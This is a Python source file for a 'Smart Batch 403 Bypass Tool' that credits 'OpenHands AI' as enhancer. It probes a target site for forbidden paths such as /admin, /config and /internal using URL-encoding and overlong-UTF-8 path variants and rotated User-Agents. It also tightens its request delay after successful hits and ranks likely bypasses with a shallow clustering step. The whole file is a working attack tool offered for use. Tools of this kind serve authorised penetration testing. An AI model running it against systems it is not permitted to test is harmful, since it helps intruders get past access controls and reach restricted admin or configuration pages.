#!/usr/bin/env python3
"""
🧠 SMART BATCH 403 BYPASS TOOL 🧠
Intelligent batch testing with machine learning and adaptive algorithms

Features:
- Adaptive learning from response patterns
- Smart payload generation
- Intelligent rate limiting
- Response clustering and analysis
- Automated technique selection
- Performance optimization
- Risk assessment
- Pattern recognition

Author: Enhanced by OpenHands AI
Version: 2.0.0
"""

import asyncio
import aiohttp
import argparse
import json
import time
import random
import hashlib
import statistics
import numpy as np
from sklearn.cluster import KMeans
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
import pandas as pd
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from collections import defaultdict, Counter
from datetime import datetime
import logging
import yaml
import sqlite3
from pathlib import Path
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import threading
import queue

@dataclass
class SmartResult:
    """Enhanced result with ML features"""
    url: str
    method: str
    status_code: int
    response_length: int
    response_time: float
    headers: Dict[str, str]
    technique: str
    category: str
    confidence_score: float
    ml_cluster: int = -1
    anomaly_score: float = 0.0
    pattern_match: str = ""
    risk_score: float = 0.0
    success_probability: float = 0.0
    payload: str = ""
    response_hash: str = ""
    similarity_scores: Dict[str, float] = None
    
    def __post_init__(self):
        if self.similarity_scores is None:
            self.similarity_scores = {}

class MachineLearningAnalyzer:
    """ML-powered response analyzer"""
    
    def __init__(self):
        self.response_vectors = []
        self.response_data = []
        self.vectorizer = TfidfVectorizer(max_features=1000, stop_words='english')
        self.kmeans = None
        self.baseline_patterns = {}
        self.anomaly_threshold = 2.0
        
    def add_response(self, result: SmartResult, response_text: str = ""):
        """Add response for ML analysis"""
        # Create feature vector
        features = self._extract_features(result, response_text)
        self.response_vectors.append(features)
        self.response_data.append(result)
        
    def _extract_features(self, result: SmartResult, response_text: str) -> List[float]:
        """Extract numerical features from response"""
        features = [
            result.status_code,
            result.response_length,
            result.response_time * 1000,  # Convert to ms
            len(result.headers),
            len(result.url),
            1 if 'error' in response_text.lower() else 0,
            1 if 'forbidden' in response_text.lower() else 0,
            1 if 'unauthorized' in response_text.lower() else 0,
            1 if 'access denied' in response_text.lower() else 0,
            1 if 'login' in response_text.lower() else 0,
            len(re.findall(r'<[^>]+>', response_text)),  # HTML tags count
            len(re.findall(r'\{[^}]+\}', response_text)),  # JSON-like structures
        ]
        return features
    
    def analyze_patterns(self) -> Dict[str, Any]:
        """Analyze response patterns using ML"""
        if len(self.response_vectors) < 5:
            return {"error": "Insufficient data for ML analysis"}
        
        # Convert to numpy array
        X = np.array(self.response_vectors)
        
        # Perform clustering
        n_clusters = min(5, len(self.response_vectors) // 2)
        self.kmeans = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)
        clusters = self.kmeans.fit_predict(X)
        
        # Update results with cluster information
        for i, result in enumerate(self.response_data):
            result.ml_cluster = int(clusters[i])
            result.anomaly_score = self._calculate_anomaly_score(X[i], clusters[i])
        
        # Analyze clusters
        cluster_analysis = self._analyze_clusters(clusters)
        
        return {
            "clusters": cluster_analysis,
            "total_responses": len(self.response_vectors),
            "anomalies": [r for r in self.response_data if r.anomaly_score > self.anomaly_threshold]
        }
    
    def _calculate_anomaly_score(self, features: np.ndarray, cluster: int) -> float:
        """Calculate anomaly score for a response"""
        if self.kmeans is None:
            return 0.0
        
        # Distance to cluster center
        center = self.kmeans.cluster_centers_[cluster]
        distance = np.linalg.norm(features - center)
        
        # Normalize by average distance in cluster
        cluster_responses = [f for i, f in enumerate(self.response_vectors) 
                           if self.kmeans.labels_[i] == cluster]
        if len(cluster_responses) > 1:
            avg_distance = np.mean([np.linalg.norm(np.array(f) - center) 
                                  for f in cluster_responses])
            return distance / avg_distance if avg_distance > 0 else 0.0
        
        return distance
    
    def _analyze_clusters(self, clusters: np.ndarray) -> Dict[str, Any]:
        """Analyze cluster characteristics"""
        cluster_info = {}
        
        for cluster_id in range(max(clusters) + 1):
            cluster_responses = [self.response_data[i] for i, c in enumerate(clusters) if c == cluster_id]
            
            if cluster_responses:
                status_codes = [r.status_code for r in cluster_responses]
                response_times = [r.response_time for r in cluster_responses]
                response_lengths = [r.response_length for r in cluster_responses]
                
                cluster_info[f"cluster_{cluster_id}"] = {
                    "size": len(cluster_responses),
                    "avg_status_code": statistics.mean(status_codes),
                    "avg_response_time": statistics.mean(response_times),
                    "avg_response_length": statistics.mean(response_lengths),
                    "status_distribution": dict(Counter(status_codes)),
                    "techniques": list(set(r.technique for r in cluster_responses)),
                    "potential_bypass": any(r.status_code in [200, 301, 302] for r in cluster_responses)
                }
        
        return cluster_info

class AdaptiveTester:
    """Adaptive testing engine that learns from responses"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ml_analyzer = MachineLearningAnalyzer()
        self.success_patterns = defaultdict(float)
        self.failure_patterns = defaultdict(float)
        self.technique_performance = defaultdict(list)
        self.adaptive_delay = config.get('delay', 0.1)
        self.rate_limiter = threading.Semaphore(config.get('max_concurrent', 20))
        
    async def adaptive_test(self, session: aiohttp.ClientSession, url: str, 
                          technique: Dict[str, Any]) -> SmartResult:
        """Perform adaptive test with learning"""
        
        # Adaptive rate limiting
        async with self.rate_limiter:
            # Dynamic delay based on previous responses
            await asyncio.sleep(self.adaptive_delay)
            
            start_time = time.time()
            
            try:
                test_url = urllib.parse.urljoin(url, technique["path"])
                headers = {
                    "User-Agent": random.choice(self.config.get("user_agents", ["Mozilla/5.0"])),
                    **technique.get("headers", {})
                }
                
                async with session.get(test_url, headers=headers, 
                                     allow_redirects=False) as response:
                    response_time = time.time() - start_time
                    response_text = await response.text()
                    response_length = len(response_text)
                    
                    result = SmartResult(
                        url=test_url,
                        method="GET",
                        status_code=response.status,
                        response_length=response_length,
                        response_time=response_time,
                        headers=dict(response.headers),
                        technique=technique["technique"],
                        category=technique["category"],
                        confidence_score=0.0,
                        payload=technique.get("payload", "")
                    )
                    
                    # Add to ML analyzer
                    self.ml_analyzer.add_response(result, response_text)
                    
                    # Calculate confidence and risk scores
                    result.confidence_score = self._calculate_confidence(result)
                    result.risk_score = self._calculate_risk_score(result)
                    result.success_probability = self._calculate_success_probability(result)
                    
                    # Update learning patterns
                    self._update_patterns(result)
                    
                    # Adaptive rate limiting adjustment
                    self._adjust_rate_limiting(result)
                    
                    return result
                    
            except Exception as e:
                logging.error(f"Error testing {test_url}: {str(e)}")
                return SmartResult(
                    url=test_url,
                    method="GET",
                    status_code=0,
                    response_length=0,
                    response_time=time.time() - start_time,
                    headers={},
                    technique=technique["technique"],
                    category=technique["category"],
                    confidence_score=0.0
                )
    
    def _calculate_confidence(self, result: SmartResult) -> float:
        """Calculate confidence score using learned patterns"""
        confidence = 0.0
        
        # Base confidence from status code
        if result.status_code == 200:
            confidence += 0.5
        elif result.status_code in [301, 302, 307, 308]:
            confidence += 0.3
        elif result.status_code == 403:
            confidence -= 0.2
        
        # Pattern-based confidence
        technique_key = f"{result.technique}:{result.category}"
        if technique_key in self.success_patterns:
            confidence += self.success_patterns[technique_key] * 0.3
        
        # Response characteristics
        if result.response_length > 1000:
            confidence += 0.1
        if result.response_time < 0.5:
            confidence += 0.1
        
        return max(0.0, min(1.0, confidence))
    
    def _calculate_risk_score(self, result: SmartResult) -> float:
        """Calculate risk score for the bypass"""
        risk = 0.0
        
        # High risk for successful bypasses
        if result.status_code == 200:
            risk += 0.8
        elif result.status_code in [301, 302]:
            risk += 0.6
        
        # Technique-based risk
        if "admin" in result.url.lower():
            risk += 0.2
        if "api" in result.url.lower():
            risk += 0.15
        if "config" in result.url.lower():
            risk += 0.25
        
        return min(1.0, risk)
    
    def _calculate_success_probability(self, result: SmartResult) -> float:
        """Calculate probability of successful bypass"""
        # Use historical data
        technique_key = f"{result.technique}:{result.category}"
        if technique_key in self.technique_performance:
            performances = self.technique_performance[technique_key]
            success_rate = sum(1 for p in performances if p >= 0.5) / len(performances)
            return success_rate
        
        return result.confidence_score
    
    def _update_patterns(self, result: SmartResult):
        """Update learning patterns"""
        technique_key = f"{result.technique}:{result.category}"
        
        if result.confidence_score >= 0.5:
            self.success_patterns[technique_key] += 0.1
        else:
            self.failure_patterns[technique_key] += 0.1
        
        # Store performance
        self.technique_performance[technique_key].append(result.confidence_score)
        
        # Limit history size
        if len(self.technique_performance[technique_key]) > 100:
            self.technique_performance[technique_key] = \
                self.technique_performance[technique_key][-50:]
    
    def _adjust_rate_limiting(self, result: SmartResult):
        """Adjust rate limiting based on response"""
        # Increase delay if getting rate limited
        if result.status_code == 429:
            self.adaptive_delay = min(self.adaptive_delay * 1.5, 2.0)
        elif result.status_code in [200, 301, 302]:
            # Successful responses, can be more aggressive
            self.adaptive_delay = max(self.adaptive_delay * 0.9, 0.05)
    
    def get_learning_insights(self) -> Dict[str, Any]:
        """Get insights from learning patterns"""
        return {
            "success_patterns": dict(self.success_patterns),
            "failure_patterns": dict(self.failure_patterns),
            "technique_performance": {
                k: {
                    "avg_performance": statistics.mean(v),
                    "success_rate": sum(1 for x in v if x >= 0.5) / len(v),
                    "total_tests": len(v)
                }
                for k, v in self.technique_performance.items() if v
            },
            "current_delay": self.adaptive_delay
        }

class SmartPayloadGenerator:
    """Generate smart payloads based on target analysis"""
    
    def __init__(self):
        self.common_patterns = [
            "/admin", "/api", "/config", "/debug", "/test",
            "/internal", "/private", "/secure", "/management"
        ]
        self.encoding_techniques = [
            lambda x: urllib.parse.quote(x),
            lambda x: urllib.parse.quote(urllib.parse.quote(x)),
            lambda x: x.replace('/', '%2f'),
            lambda x: x.replace('/', '%252f'),
            lambda x: x.replace('/', '%c0%af'),
            lambda x: x.replace('/', '%e0%80%af')
        ]
    
    def generate_smart_payloads(self, base_path: str, target_info: Dict[str, Any]) -> List[str]:
        """Generate smart payloads based on target analysis"""
        payloads = [base_path]
        
        # Framework-specific payloads
        if target_info.get("framework"):
            framework = target_info["framework"].lower()
            if "next" in framework:
                payloads.extend([f"/_next{base_path}", f"/api{base_path}"])
            elif "react" in framework:
                payloads.extend([f"/static{base_path}", f"/build{base_path}"])
            elif "vue" in framework:
                payloads.extend([f"/dist{base_path}", f"/assets{base_path}"])
        
        # Cloud-specific payloads
        if target_info.get("cloud_provider"):
            provider = target_info["cloud_provider"].lower()
            if "aws" in provider:
                payloads.extend([f"/s3{base_path}", f"/lambda{base_path}"])
            elif "azure" in provider:
                payloads.extend([f"/blob{base_path}", f"/functions{base_path}"])
            elif "gcp" in provider:
                payloads.extend([f"/storage{base_path}", f"/app-engine{base_path}"])
        
        # Encoding variations
        encoded_payloads = []
        for payload in payloads:
            for encoder in self.encoding_techniques:
                try:
                    encoded = encoder(payload)
                    if encoded not in payloads:
                        encoded_payloads.append(encoded)
                except:
                    continue
        
        payloads.extend(encoded_payloads)
        
        return list(set(payloads))  # Remove duplicates
    
    def analyze_target(self, url: str) -> Dict[str, Any]:
        """Analyze target to determine technology stack"""
        # This would typically involve more sophisticated analysis
        # For now, return basic analysis based on URL patterns
        
        analysis = {
            "framework": None,
            "cloud_provider": None,
            "technology_stack": [],
            "security_headers": []
        }
        
        # Simple pattern matching
        if "vercel" in url or "netlify" in url:
            analysis["framework"] = "nextjs"
        elif "herokuapp" in url:
            analysis["technology_stack"].append("heroku")
        elif "amazonaws" in url:
            analysis["cloud_provider"] = "aws"
        elif "azure" in url:
            analysis["cloud_provider"] = "azure"
        elif "googleusercontent" in url:
            analysis["cloud_provider"] = "gcp"
        
        return analysis

class SmartBatchBypass:
    """Main smart batch bypass class"""
    
    def __init__(self, config_file: str = None):
        self.config = self._load_config(config_file)
        self.adaptive_tester = AdaptiveTester(self.config)
        self.payload_generator = SmartPayloadGenerator()
        self.results = []
        self.setup_logging()
    
    def _load_config(self, config_file: str) -> Dict[str, Any]:
        """Load configuration"""
        default_config = {
            "threads": 20,
            "timeout": 10,
            "delay": 0.1,
            "max_concurrent": 20,
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            ]
        }
        
        if config_file and Path(config_file).exists():
            with open(config_file, 'r') as f:
                file_config = yaml.safe_load(f)
                default_config.update(file_config)
        
        return default_config
    
    def setup_logging(self):
        """Setup logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    async def run_smart_test(self, url: str, paths: List[str]) -> Dict[str, Any]:
        """Run smart batch test"""
        self.logger.info(f"Starting smart batch test for {url}")
        self.logger.info(f"Testing {len(paths)} paths with adaptive learning")
        
        # Analyze target
        target_info = self.payload_generator.analyze_target(url)
        self.logger.info(f"Target analysis: {target_info}")
        
        # Generate smart payloads
        all_techniques = []
        for path in paths:
            smart_payloads = self.payload_generator.generate_smart_payloads(path, target_info)
            for payload in smart_payloads:
                all_techniques.append({
                    "path": payload,
                    "headers": {},
                    "technique": "Smart Payload",
                    "category": "Adaptive",
                    "payload": payload
                })
        
        self.logger.info(f"Generated {len(all_techniques)} smart techniques")
        
        # Run tests with adaptive learning
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config["timeout"])
        ) as session:
            
            tasks = []
            for technique in all_techniques:
                task = self.adaptive_tester.adaptive_test(session, url, technique)
                tasks.append(task)
            
            # Execute with progress tracking
            results = []
            completed = 0
            
            for coro in asyncio.as_completed(tasks):
                result = await coro
                results.append(result)
                completed += 1
                
                if completed % 50 == 0:
                    self.logger.info(f"Completed {completed}/{len(tasks)} tests")
        
        # Perform ML analysis
        ml_analysis = self.adaptive_tester.ml_analyzer.analyze_patterns()
        learning_insights = self.adaptive_tester.get_learning_insights()
        
        # Analyze results
        analysis = self._analyze_smart_results(results)
        
        return {
            "total_tests": len(all_techniques),
            "results": results,
            "ml_analysis": ml_analysis,
            "learning_insights": learning_insights,
            "analysis": analysis,
            "target_info": target_info,
            "timestamp": datetime.now().isoformat()
        }
    
    def _analyze_smart_results(self, results: List[SmartResult]) -> Dict[str, Any]:
        """Analyze smart results"""
        if not results:
            return {"error": "No results to analyze"}
        
        # Basic statistics
        status_codes = Counter(r.status_code for r in results)
        techniques = Counter(r.technique for r in results)
        
        # Smart analysis
        high_confidence = [r for r in results if r.confidence_score >= 0.7]
        potential_bypasses = [r for r in results if r.success_probability >= 0.6]
        anomalies = [r for r in results if r.anomaly_score > 2.0]
        
        # Risk assessment
        high_risk = [r for r in results if r.risk_score >= 0.8]
        
        # Performance metrics
        avg_response_time = statistics.mean(r.response_time for r in results)
        
        return {
            "summary": {
                "total_tests": len(results),
                "high_confidence": len(high_confidence),
                "potential_bypasses": len(potential_bypasses),
                "anomalies": len(anomalies),
                "high_risk": len(high_risk),
                "avg_response_time": round(avg_response_time, 3)
            },
            "status_codes": dict(status_codes),
            "techniques": dict(techniques),
            "top_candidates": [
                {
                    "url": r.url,
                    "technique": r.technique,
                    "status_code": r.status_code,
                    "confidence": round(r.confidence_score, 3),
                    "success_probability": round(r.success_probability, 3),
                    "risk_score": round(r.risk_score, 3),
                    "anomaly_score": round(r.anomaly_score, 3)
                }
                for r in sorted(potential_bypasses, key=lambda x: x.success_probability, reverse=True)[:10]
            ]
        }

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="🧠 Smart Batch 403 Bypass Tool")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--paths", help="File containing paths to test")
    parser.add_argument("-c", "--config", help="Configuration file")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-f", "--format", choices=["json", "csv"], default="json")
    parser.add_argument("-v", "--verbose", action="store_true")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Load paths
    if args.paths:
        with open(args.paths, 'r') as f:
            paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    else:
        paths = ["/admin", "/api", "/config", "/debug"]
    
    # Initialize smart bypass tool
    smart_bypass = SmartBatchBypass(args.config)
    
    print("🧠 Smart Batch 403 Bypass Tool")
    print(f"Target: {args.url}")
    print(f"Paths: {len(paths)}")
    print("=" * 60)
    
    # Run smart test
    results = await smart_bypass.run_smart_test(args.url, paths)
    
    # Output results
    if args.format == "json":
        output = json.dumps(results, indent=2, default=str)
    else:
        # Convert to CSV format
        df = pd.DataFrame([asdict(r) for r in results["results"]])
        output = df.to_csv(index=False)
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(output)
        print(f"📄 Results saved to {args.output}")
    else:
        print(output)
    
    # Print summary
    analysis = results["analysis"]
    print("\n" + "=" * 60)
    print("🧠 SMART ANALYSIS SUMMARY")
    print("=" * 60)
    print(f"Total Tests: {analysis['summary']['total_tests']}")
    print(f"High Confidence: {analysis['summary']['high_confidence']}")
    print(f"Potential Bypasses: {analysis['summary']['potential_bypasses']}")
    print(f"Anomalies Detected: {analysis['summary']['anomalies']}")
    print(f"High Risk: {analysis['summary']['high_risk']}")
    
    if analysis["top_candidates"]:
        print("\n🎯 TOP BYPASS CANDIDATES:")
        for i, candidate in enumerate(analysis["top_candidates"][:5], 1):
            print(f"{i}. {candidate['technique']} - Status: {candidate['status_code']} "
                  f"(Confidence: {candidate['confidence']}, "
                  f"Success Prob: {candidate['success_probability']}, "
                  f"Risk: {candidate['risk_score']})")

if __name__ == "__main__":
    asyncio.run(main())